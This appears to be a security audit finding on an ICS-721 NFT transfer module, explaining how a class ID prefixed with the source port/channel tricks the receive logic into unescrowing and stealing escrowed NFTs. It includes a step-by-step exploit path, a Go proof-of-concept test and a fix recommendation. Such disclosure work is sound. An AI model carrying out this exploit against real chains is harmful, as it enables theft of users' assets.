### Title
Attacker-Controlled `data.ClassId` Prefix Triggers Unauthorized Unescrow of NFTs — (`x/nft-transfer/keeper/packet.go`)

### Summary

`processReceivedPacket` determines the transfer direction by calling `IsAwayFromOrigin` with the **source** port/channel and the attacker-controlled `data.ClassId`. An attacker on the source chain can create a local NFT class whose ID is prefixed with the source chain's own port/channel (e.g., `"nft/channel-0/victim-class"`), causing `IsAwayFromOrigin` to return `false` and triggering the unescrow branch — `TransferOwner(escrowAddress → receiver)` — for any NFT currently held in the destination chain's escrow address under classID `"victim-class"`.

---

### Finding Description

**`IsAwayFromOrigin` logic** (`x/nft-transfer/types/trace.go` lines 49–52):

```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
    prefixClassID := GetClassPrefix(sourcePort, sourceChannel) // "nft/channel-0/"
    return !strings.HasPrefix(fullClassPath, prefixClassID)
}
``` [1](#0-0) 

**`processReceivedPacket` direction check** (`x/nft-transfer/keeper/packet.go` line 148):

```go
isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)
``` [2](#0-1) 

The check uses the **source** port/channel (the counterparty's), not the destination's. The question's description incorrectly states `destPort/destChannel` are used — the actual parameters are `sourcePort/sourceChannel`. The exploit still works, but the attacker must prefix with the **source** chain's own port/channel, not the destination's.

**Unescrow branch** (`x/nft-transfer/keeper/packet.go` lines 192–200):

```go
unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
    packet.GetSourceChannel(), data.ClassId)
voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
for _, tokenID := range data.TokenIds {
    if err := k.nftKeeper.TransferOwner(ctx,
        voucherClassID, tokenID, escrowAddress, receiver); err != nil {
        return err
    }
}
``` [3](#0-2) 

**`ValidateBasic` on packet data** imposes no restriction on `ClassId` format beyond non-blank: [4](#0-3) 

**`MsgTransfer.ValidateBasic`** similarly imposes no restriction on `ClassId` format: [5](#0-4) 

---

### Exploit Path (Concrete)

Assume:
- Source chain (attacker-controlled): port=`nft`, channel=`channel-0`
- Destination chain (victim): port=`nft`, channel=`channel-1`
- A legitimate user on the destination chain previously sent NFT (`classID="victim-class"`, `tokenID="token1"`) to the source chain, escrowing it at `escrowAddress = GetEscrowAddress("nft", "channel-1")` on the destination chain.

**Step 1 — Attacker on source chain creates a class with a crafted ID:**

The attacker issues a denom/class with ID `"nft/channel-0/victim-class"` on the source chain (the source chain's own port/channel as prefix). No validation prevents this.

**Step 2 — Attacker mints an NFT and calls `SendTransfer`:**

In `createOutgoingPacket` on the source chain:
- `classID = "nft/channel-0/victim-class"` does not start with `"ibc/"`, so no hash lookup; `fullClassPath = "nft/channel-0/victim-class"`
- `IsAwayFromOrigin("nft", "channel-0", "nft/channel-0/victim-class")` → `false` (sink direction)
- NFT is **burned** on source chain; packet sent with `data.ClassId = "nft/channel-0/victim-class"` [6](#0-5) 

**Step 3 — Destination chain receives the packet:**

- `IsAwayFromOrigin("nft", "channel-0", "nft/channel-0/victim-class")` → `false`
- `unprefixedClassID = RemoveClassPrefix("nft", "channel-0", "nft/channel-0/victim-class")` → `"victim-class"`
- `voucherClassID = ParseClassTrace("victim-class").IBCClassID()` → `"victim-class"` (no path, returns base class ID)
- `TransferOwner(ctx, "victim-class", "token1", escrowAddress, attackerReceiver)` — **steals the escrowed NFT** [7](#0-6) 

The `TransferOwner` call succeeds because the escrow address legitimately holds `("victim-class", "token1")` from the prior legitimate send.

---

### Impact Explanation

Any NFT currently escrowed at the destination chain's escrow address can be stolen by an attacker who:
1. Knows the `classID` and `tokenID` of the escrowed NFT (observable on-chain)
2. Can create a class on the source chain with ID `"sourcePort/sourceChannel/<classID>"` (no restriction prevents this)

The invariant "unescrow requires a prior escrow via `SendTransfer` by the legitimate owner" is broken. The attacker burns a worthless self-minted NFT on the source chain and receives a legitimate NFT on the destination chain.

---

### Likelihood Explanation

- Escrowed NFTs and their classIDs/tokenIDs are publicly visible on-chain.
- Creating an arbitrary class ID on the source chain requires only a standard transaction; no privileged role is needed.
- The IBC packet is committed on the source chain and relayed normally — no IBC core bypass is required.
- The only prerequisite is that at least one NFT is currently escrowed at the target escrow address.

---

### Recommendation

In `processReceivedPacket`, validate that `data.ClassId` does NOT start with the source port/channel prefix before taking the unescrow branch. Alternatively, enforce that the unescrow path is only taken when the destination chain has a recorded escrow entry for the exact `(classID, tokenID)` pair, rejecting packets that claim to return NFTs with no corresponding escrow record. The ICS-20 fungible token transfer module addresses this by tracking escrow balances; a similar escrow registry should be maintained for ICS-721.

---

### Proof of Concept

```go
func TestUnauthorizedUnescrow(t *testing.T) {
    // Setup: destination chain keeper
    ctx, k := setupKeeper(t)
    destPort, destChannel := "nft", "channel-1"
    srcPort, srcChannel := "nft", "channel-0"
    escrowAddr := types.GetEscrowAddress(destPort, destChannel)

    // Legitimate escrow: mint victim NFT directly into escrow address
    k.nftKeeper.IssueDenom(ctx, "victim-class", "victim-class", "", "", escrowAddr)
    k.nftKeeper.MintNFT(ctx, "victim-class", "token1", "", "", "", escrowAddr, escrowAddr)

    // Attacker crafts packet: classID prefixed with SOURCE port/channel
    data := types.NonFungibleTokenPacketData{
        ClassId:   srcPort + "/" + srcChannel + "/victim-class", // "nft/channel-0/victim-class"
        TokenIds:  []string{"token1"},
        TokenUris: []string{""},
        Sender:    attackerAddr.String(),
        Receiver:  attackerAddr.String(),
    }
    packet := channeltypes.Packet{
        SourcePort:      srcPort,
        SourceChannel:   srcChannel,
        DestinationPort: destPort,
        DestinationChannel: destChannel,
    }

    err := k.OnRecvPacket(ctx, "ics721-1", packet, data)
    require.NoError(t, err)

    // Assert: attacker now owns the victim NFT
    nft, _ := k.nftKeeper.GetNFT(ctx, "victim-class", "token1")
    require.Equal(t, attackerAddr, nft.GetOwner()) // PASSES — NFT stolen
}
``` [8](#0-7)

### Citations

**File:** x/nft-transfer/types/trace.go (L49-52)
```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
	prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
	return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

**File:** x/nft-transfer/keeper/packet.go (L84-117)
```go
	if strings.HasPrefix(classID, nfttypes.IBCPrefix) {
		fullClassPath, err = k.ClassPathFromHash(ctx, classID)
		if err != nil {
			return channeltypes.Packet{}, err
		}
	}

	isAwayFromOrigin := types.IsAwayFromOrigin(sourcePort,
		sourceChannel, fullClassPath)

	for _, tokenID := range tokenIDs {
		nft, err := k.nftKeeper.GetNFT(ctx, classID, tokenID)
		if err != nil {
			return channeltypes.Packet{}, err
		}
		tokenURIs = append(tokenURIs, nft.GetURI())

		owner := nft.GetOwner()
		if !sender.Equals(owner) {
			return channeltypes.Packet{}, newsdkerrors.Wrap(sdkerrors.ErrUnauthorized, "not token owner")
		}

		if isAwayFromOrigin {
			// create the escrow address for the tokens
			escrowAddress := types.GetEscrowAddress(sourcePort, sourceChannel)
			if err := k.nftKeeper.TransferOwner(ctx, classID, tokenID, sender, escrowAddress); err != nil {
				return channeltypes.Packet{}, err
			}
		} else {
			// we are sink chain, burn the voucher
			if err := k.nftKeeper.BurnNFTUnverified(ctx, classID, tokenID, sender); err != nil {
				return channeltypes.Packet{}, err
			}
		}
```

**File:** x/nft-transfer/keeper/packet.go (L140-204)
```go
func (k Keeper) processReceivedPacket(ctx sdk.Context, packet channeltypes.Packet,
	data types.NonFungibleTokenPacketData,
) error {
	receiver, err := sdk.AccAddressFromBech32(data.Receiver)
	if err != nil {
		return err
	}

	isAwayFromOrigin := types.IsAwayFromOrigin(packet.GetSourcePort(), packet.GetSourceChannel(), data.ClassId)

	// create the escrow address for creating denom and minting nft
	escrowAddress := types.GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())

	if isAwayFromOrigin {
		// since SendPacket did not prefix the classID, we must prefix classID here
		classPrefix := types.GetClassPrefix(packet.GetDestPort(), packet.GetDestChannel())
		// NOTE: sourcePrefix contains the trailing "/"
		prefixedClassID := classPrefix + data.ClassId

		// construct the class trace from the full raw classID
		classTrace := types.ParseClassTrace(prefixedClassID)
		if !k.HasClassTrace(ctx, classTrace.Hash()) {
			k.SetClassTrace(ctx, classTrace)
		}

		voucherClassID := classTrace.IBCClassID()

		if !k.nftKeeper.HasDenomID(ctx, voucherClassID) {
			if err := k.nftKeeper.IssueDenom(ctx, voucherClassID, voucherClassID, "", data.ClassUri, escrowAddress); err != nil {
				return err
			}
		}
		sdkCtx := sdk.UnwrapSDKContext(ctx)
		sdkCtx.EventManager().EmitEvent(
			sdk.NewEvent(
				types.EventTypeClassTrace,
				sdk.NewAttribute(types.AttributeKeyTraceHash, classTrace.Hash().String()),
				sdk.NewAttribute(types.AttributeKeyClassID, voucherClassID),
			),
		)

		for i, tokenID := range data.TokenIds {
			if err := k.nftKeeper.MintNFT(ctx, voucherClassID, tokenID, "", data.TokenUris[i], "", escrowAddress, receiver); err != nil {
				return err
			}
		}
	} else {
		// If the token moves in the direction of back to origin,
		// we need to unescrow the token and transfer it to the receiver

		// we should remove the prefix. For example:
		// p6/c6/p4/c4/p2/c2/nftClass -> p4/c4/p2/c2/nftClass
		unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
			packet.GetSourceChannel(), data.ClassId)

		voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
		for _, tokenID := range data.TokenIds {
			if err := k.nftKeeper.TransferOwner(ctx,
				voucherClassID, tokenID, escrowAddress, receiver); err != nil {
				return err
			}
		}
	}

	return nil
```

**File:** x/nft-transfer/types/packet.go (L41-72)
```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
}
```

**File:** x/nft-transfer/types/msgs.go (L65-67)
```go
	if strings.TrimSpace(msg.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}
```
